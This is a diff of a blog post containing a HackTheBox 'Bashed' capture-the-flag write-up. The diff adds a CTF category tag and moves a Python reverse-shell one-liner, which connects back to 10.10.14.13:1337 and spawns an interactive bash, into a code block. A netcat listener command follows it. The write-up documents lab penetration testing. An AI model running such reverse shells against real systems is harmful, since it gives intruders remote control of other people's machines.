@@ -1,6 +1,7 @@
 ---
 layout: post
 title: HackTheBox - Bashed write-up
+categories: CTF
 ---
 Nmap TCP scan result:
 ```
@@ -56,7 +57,11 @@ User www-data may run the following commands on bashed:
 (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
-Let's upgrade to the reverse shell. I issue `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'` in the webshell and catch the reverse shell with `nc -lvnp 1337` on my Kali machine.
+Let's upgrade to the reverse shell. I issue the following one-liner in the webshell:
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+and catch the reverse shell with `nc -lvnp 1337` on my Kali machine.
 
 ```
 k-lazarev@kali:~/bin/LinEnum$ nc -lvnp 1337
